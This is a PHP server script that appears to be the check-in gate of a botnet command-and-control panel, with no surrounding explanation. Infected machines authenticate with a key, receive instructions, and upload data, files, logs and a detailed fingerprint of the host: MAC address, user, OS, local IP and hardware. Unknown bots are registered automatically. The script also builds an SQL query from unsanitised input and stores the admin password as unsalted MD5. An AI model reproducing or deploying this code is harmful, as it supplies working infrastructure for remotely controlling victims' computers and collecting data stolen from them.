<?php
 include 'assets/functions.php';
 require_once('assets/config.php');

 $key = base64_decode($_GET['key']);
 $uid = base64_decode($_GET['id']);
 $marker = base64_decode($_GET['marker']);

 $query = $mysqli->query("SELECT * FROM administrators WHERE id=1");
 $result = $query->fetch_assoc();

 if( $result['apass'] == md5($key) ) {
 	//- DBQuery -//
 	$query = $mysqli->query("SELECT uid FROM bots WHERE uid='$uid'");
 	$result = $query->fetch_assoc();

 	if(isset($result['uid'])) {
 		switch($marker) {
 			case "Indication":
 				return_instruction($uid);
 				break;

 			case "Info":
 				accept_data($uid, base64_decode($_GET['info']));
 				break;

 			case "File":
 				accept_file($uid);
 				break;

 			case "Log":
 				$info = base64_decode($_GET['info']);
 				accept_log($uid, $info);
 				break;

 			case "Cfg":
 				$mac = base64_decode($_GET['mac']);
 				$tmz = base64_decode($_GET['tmz']);
 				$cpu = base64_decode($_GET['cpu']);
 				$gpu = base64_decode($_GET['gpu']);
 				$mhn = base64_decode($_GET['mhn']);
 				$usr = base64_decode($_GET['usr']);
 				$os = base64_decode($_GET['os']);
 				$lip = base64_decode($_GET['lip']);
 				$tag = base64_decode($_GET['tag']);
 				$ram = base64_decode($_GET['ram']);
 				accept_cfg($uid, $mac, $tmz, $cpu, $gpu, $mhn, $usr, $os, $lip, $tag, $ram);
 				break;
 		}		
 	} else { 
 		
 		create_new_user($uid, $tag); 
 	}
 }
?>